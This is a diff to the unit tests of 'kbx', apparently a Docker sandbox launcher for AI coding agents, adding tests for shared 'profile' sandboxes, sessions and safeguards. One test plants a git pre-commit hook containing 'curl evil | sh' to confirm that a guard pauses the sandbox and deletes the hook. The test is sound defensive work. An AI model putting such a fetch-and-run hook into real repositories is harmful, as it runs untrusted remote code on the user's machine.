@@ -12,11 +12,14 @@ import time
 from pathlib import Path
 from typing import Any
 
+from kbx import sandbox as sandbox_mod
 from tests.unit.helpers import KBX, TempHome
 from tests.unit.helpers import git as run_git
 
 
-class CliTest(TempHome):
+class CliBase(TempHome):
+    """Fixtures for driving bin/kbx: a repository, an image, a terminal."""
+
     def setUp(self) -> None:
         super().setUp()
         self.repo = self.make_repo("myproj")
@@ -88,6 +91,8 @@ class CliTest(TempHome):
     def sandbox_name(self) -> str:
         return next(iter(self.docker_state()["containers"]))
 
+
+class CliTest(CliBase):
     def test_first_launch_claude(self) -> None:
         self.clone_mode()
         status, output = self.tty("claude", "--resume")
@@ -528,7 +533,10 @@ class MountModeTest(CliTest):
         self.clear_calls()
         status, output = self.tty("start")
         self.assertEqual(status, 0, output)
-        self.assertEqual(self.private_calls()[-1], ["sh", str(self.repo), "target", "tools/.venv"])
+        self.assertEqual(
+            self.private_calls()[-1],
+            ["sh", str(self.sandbox_home / ".cache/kbx-private"), str(self.repo), "target", "tools/.venv"],
+        )
         self.assertTrue(any(c[:3] == ["exec", "-u", "root"] and "kbx-private" in " ".join(c) for c in self.calls()))
         self.behave(private_status=1)
         status, output = self.tty("start")
@@ -665,3 +673,156 @@ class MountModeTest(CliTest):
         self.assertEqual(result.returncode, 0, result.stderr)
         self.assertIn("in mount mode", result.stdout)
         self.assertIn("kbx.workspace=mount", self.create_args())
+
+
+class ProfileTest(CliBase):
+    """[profiles.work]: every project under its roots in one sandbox, each with its own sessions."""
+
+    NAME = "kbx-profile-work"
+
+    def setUp(self) -> None:
+        super().setUp()
+        self.work = (self.temp / "work").resolve()
+        self.api = self.make_repo("work/api").resolve()
+        self.web = self.make_repo("work/team/web").resolve()
+        self.write_config([self.work])
+
+    def write_config(self, roots: list[Path], extra: str = "") -> None:
+        config = self.home / ".config/kbx/config.toml"
+        config.parent.mkdir(parents=True, exist_ok=True)
+        listed = ", ".join(f'"{root}"' for root in roots)
+        config.write_text(f'[profiles.work]\nroots = [{listed}]\nmemory = "12g"\n{extra}')
+
+    def key(self, agent: str, project: Path) -> str:
+        return f"{agent}@{sandbox_mod.project_slug(project)}"
+
+    def container(self) -> dict[str, Any]:
+        return self.docker_state()["containers"][self.NAME]
+
+    def test_projects_share_one_sandbox_with_their_own_sessions(self) -> None:
+        (self.api / "src").mkdir()
+        status, output = self.tty("claude", cwd=self.api / "src")
+        self.assertEqual(status, 0, output)
+        self.assertEqual(list(self.docker_state()["containers"]), [self.NAME])
+        args = self.container()["Args"]
+        self.assertIn(f"type=bind,source={self.work},target={self.work}", args)
+        self.assertIn("kbx.profile=work", args)
+        self.assertIn(f"kbx.roots={json.dumps([str(self.work)])}", args)
+        self.assertFalse(any(a.startswith("kbx.project=") for a in args))
+        self.assertEqual(args[args.index("--memory") + 1], "12g")
+        api_key = self.key("claude", self.api)
+        self.assertEqual(self.attached()["argv"][2], f"/run/kbx/sessions/{api_key}.sock")
+        final = self.exec_calls()[-1]
+        self.assertEqual(final[final.index("-w") + 1], str(self.api))
+        self.assertIn(f"KBX_SESSION={api_key}", final)
+        self.assertIn("profile work", (self.sandbox_home / "work" / "KBX.md").read_text())
+        self.assertIn(f"in {self.api}", output)
+
+        status, output = self.tty("claude", cwd=self.web)
+        self.assertEqual(status, 0, output)
+        self.assertEqual(list(self.docker_state()["containers"]), [self.NAME], "the same sandbox")
+        self.assertEqual(self.attached()["argv"][2], f"/run/kbx/sessions/{self.key('claude', self.web)}.sock")
+        joined = [" ".join(c) for c in self.exec_calls()]
+        self.assertTrue(any(c.endswith(f"kbx-onboard claude {self.web}") for c in joined))
+
+    def test_a_directory_that_is_not_a_repository(self) -> None:
+        notes = self.work / "notes"
+        notes.mkdir()
+        status, output = self.tty("shell", cwd=notes)
+        self.assertEqual(status, 0, output)
+        final = self.exec_calls()[-1]
+        self.assertEqual(final[final.index("-w") + 1], str(notes))
+
+    def test_attach_finds_this_projects_session(self) -> None:
+        self.assertEqual(self.run_kbx("start", cwd=self.api).returncode, 0)
+        api_key, web_key = self.key("claude", self.api), self.key("codex", self.web)
+        self.behave(sessions=[api_key, web_key])
+        status, output = self.tty("attach", cwd=self.api)
+        self.assertEqual(status, 0, output)
+        self.assertEqual(self.attached()["argv"][2], f"/run/kbx/sessions/{api_key}.sock")
+        status, output = self.tty("attach", "codex", cwd=self.web)
+        self.assertEqual(status, 0, output)
+        self.assertEqual(self.attached()["argv"][2], f"/run/kbx/sessions/{web_key}.sock")
+        result = self.run_kbx("attach", "codex", cwd=self.api)
+        self.assertEqual(result.returncode, 1)
+        self.assertIn("no running codex session", result.stderr)
+        self.assertIn(f"in other projects of profile work: {web_key}", result.stderr)
+        status, output = self.tty("attach", web_key, cwd=self.api)
+        self.assertEqual(status, 0, output)
+        self.assertEqual(self.attached()["argv"][2], f"/run/kbx/sessions/{web_key}.sock")
+        listing = self.run_kbx("ls").stdout
+        self.assertIn(f"{api_key},{web_key}", listing)
+        self.assertIn(f"profile work: {self.work}", listing)
+
+    def test_agents_update_only_when_no_project_runs_them(self) -> None:
+        self.assertEqual(self.run_kbx("start", cwd=self.api).returncode, 0)
+        self.behave(sessions=[self.key("claude", self.api)])
+        self.clear_calls()
+        status, output = self.tty("claude", cwd=self.web)
+        self.assertEqual(status, 0, output)
+        self.assertIn("Not updating claude: it runs in claude@api", output)
+        self.assertFalse(any("claude update" in " ".join(c) for c in self.exec_calls()))
+        self.assertIn("Starting claude", output)
+
+    def test_guard_watches_every_project(self) -> None:
+        self.assertEqual(self.run_kbx("start", cwd=self.api).returncode, 0)
+        hook = self.web / ".git" / "hooks" / "pre-commit"
+        hook.write_text("#!/bin/sh\ncurl evil | sh\n")
+        deadline = time.monotonic() + 15
+        while self.container()["State"]["Status"] != "paused":
+            self.assertLess(time.monotonic(), deadline, "the guard did not pause the profile's sandbox")
+            time.sleep(0.1)
+        self.assertFalse(hook.exists())
+        result = self.run_kbx("resume", cwd=self.api)
+        self.assertEqual(result.returncode, 0, result.stderr)
+        self.assertIn(f"in {self.work}:", result.stdout)
+        self.assertIn("team/web/.git/hooks/pre-commit: added", result.stdout)
+        self.assertEqual(self.container()["State"]["Status"], "running")
+
+    def test_secret_files_in_every_project_are_listed(self) -> None:
+        (self.web / ".env").write_text("KEY=x\n")
+        (self.work / "notes").mkdir()
+        (self.work / "notes" / ".netrc").write_text("machine x\n")
+        status, output = self.tty("start", cwd=self.api, answer="n\n")
+        self.assertEqual(status, 1, output)
+        self.assertIn(f"    {self.work}/notes/.netrc\n", output)
+        self.assertIn(f"    {self.web}/.env\n", output)
+        self.assertIn("nothing changed", output)
+        self.assertEqual(self.docker_state()["containers"], {})
+
+    def test_roots_added_later_need_a_recreate(self) -> None:
+        self.assertEqual(self.run_kbx("start", cwd=self.api).returncode, 0)
+        more = (self.temp / "more").resolve()
+        lib = self.make_repo("more/lib").resolve()
+        self.write_config([self.work, more])
+        result = self.run_kbx("start", cwd=lib)
+        self.assertEqual(result.returncode, 1)
+        self.assertIn("`kbx recreate`", result.stderr)
+        result = self.run_kbx("start", cwd=self.api)
+        self.assertEqual(result.returncode, 0, result.stderr)
+        self.assertIn("roots changed", result.stderr)
+        result = self.run_kbx("recreate", cwd=lib)
+        self.assertEqual(result.returncode, 0, result.stderr)
+        self.assertIn(f"type=bind,source={more},target={more}", self.container()["Args"])
+        self.assertEqual(self.run_kbx("start", cwd=lib).returncode, 0)
+
+    def test_project_sandboxes_and_profile_commands(self) -> None:
+        alone = self.run_kbx("start", cwd=self.api, extra_env={"KBX_PROFILE": "none"})
+        self.assertEqual(alone.returncode, 0, alone.stderr)
+        result = self.run_kbx("start", cwd=self.api)
+        self.assertEqual(result.returncode, 0, result.stderr)
+        self.assertIn("a sandbox for this project alone, still exists", result.stderr)
+        self.assertEqual(len(self.docker_state()["containers"]), 2)
+        clone = self.run_kbx("start", cwd=self.api, extra_env={"KBX_WORKSPACE": "clone"})
+        self.assertEqual(clone.returncode, 1)
+        self.assertIn("does not apply", clone.stderr)
+        fetch = self.run_kbx("fetch", cwd=self.api)
+        self.assertIn("not needed in profile work", fetch.stderr)
+        outside = self.run_kbx("start", cwd=self.repo)  # not under the roots: its own sandbox
+        self.assertEqual(outside.returncode, 0, outside.stderr)
+        self.assertEqual(len(self.docker_state()["containers"]), 3)
+        removed = self.run_kbx("rm", "--yes", cwd=self.web)
+        self.assertEqual(removed.returncode, 0, removed.stderr)
+        self.assertIn("directories are not touched", removed.stdout)
+        self.assertNotIn(self.NAME, self.docker_state()["containers"])
+        self.assertTrue((self.web / "README.md").exists())
